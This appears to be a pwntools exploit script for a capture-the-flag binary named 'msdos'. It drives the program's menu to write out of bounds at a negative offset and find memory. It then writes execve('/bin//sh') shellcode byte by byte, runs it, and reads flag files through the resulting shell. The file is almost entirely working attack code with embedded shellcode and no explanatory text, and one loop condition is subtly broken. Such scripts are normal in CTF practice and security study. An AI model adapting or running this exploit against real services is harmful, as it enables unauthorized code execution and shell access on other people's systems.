from pwn import *
import sys, os
from random import randint

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "msdos"

try:
  r = remote(sys.argv[1], int(sys.argv[2]))
except:
  r = process(bin_name) #, env = {})


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

elf = ELF (bin_name);
context.word_size = elf.elfclass

#libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc

context.terminal = ["tmux", "splitw", "-h"]
#context.log_level = 'debug'

def rr ():
  r.recvuntil (": ")

def menu (idx):
  rr ()
  r.sendline (str(idx))

def s1 (idx, data, size, offset):
  assert (len(data) == size)
  """
  menu ('c')
  menu (idx)
  menu ('s')
  menu(size)
  menu(offset)
  r.send (data)
    """
  r.sendline ('c')
  r.sendline (str(idx))
  r.sendline ('s')
  r.sendline (str(size))
  r.sendline (str(offset))
  r.send (data)
  r.recvuntil ("data offset: ")
def g1 (idx):
  menu ('c')
  menu (idx)
  menu ('g')
  

def s0 (idx): 
  menu ('c')
  menu (idx)
  menu ('s')

def g0 (idx, offset, count):
  menu ('c')
  menu (idx)
  menu ('g')
  menu(offset)
  menu(count)
  return r.recvn (count*4)
  

#sc = asm(shellcraft.amd64.sh(),os='linux',arch='amd64')
sc = "\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"

rvs = [0, 1]
menu('l')
menu(0)
menu('l')
menu(0)
for _ in xrange (7):
  menu('l')
  menu(1)

org_hash = g0 (1, 0, 1)
#for i in xrange (0x1000):
s1 (2, "\x90"*4, 4, -0x8000000)

data = g0 (1, 0, 0x7fd8)

print len (data)

for i in range (0, len(data), 4):
  if org_hash != data[i:i+4]:
    print i
    break

print hex(i/4)

i = i/4 
offset = - (i * (1<<12) + 0x4000)

#for i in range (len(sc)):
i = 0
while i < range (len(sc)):
  s1 (2, sc[i], 1, offset + i)
  chk = r.recvn (1)
  if (chk != sc[i]): continue
  else :
    print "sc", i
    i += 1
    if i == len(sc):
      break

menu ('c')
menu (2)
menu ('g')
r.sendline ("/bin/cat flag")
r.sendline ("/bin/cat /flag")
r.sendline ("/bin/cat /home/*/flag")
r.interactive ()
